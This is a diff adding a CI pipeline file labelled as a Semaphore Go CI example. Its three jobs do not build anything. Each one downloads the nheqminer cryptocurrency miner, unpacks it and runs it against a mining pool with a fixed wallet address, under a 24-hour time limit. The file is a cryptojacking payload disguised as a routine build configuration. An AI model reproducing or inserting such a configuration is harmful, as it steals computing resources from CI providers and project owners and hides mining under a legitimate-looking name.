@@ -1,0 +1,30 @@
+version: v1.0
+name: Semaphore Go CI example
+agent:
+  machine:
+    type: e1-standard-4
+    os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
+blocks:
+  - name: Build project
+    task:
+      jobs:
+        - name: job
+          commands:
+            - 'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
+            - 'nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RN1aVtRnBiS62Hqt6TKY9zVfEMwgsJUCfi.Amild -p x -t 4'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
+            - 'nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RN1aVtRnBiS62Hqt6TKY9zVfEMwgsJUCfi.Amild -p x -t 4'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tgz '
+            - 'tar -xvf nheqminer-Linux-v0.8.2.tar.gz '
+            - 'nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RN1aVtRnBiS62Hqt6TKY9zVfEMwgsJUCfi.Amild -p x -t 4'
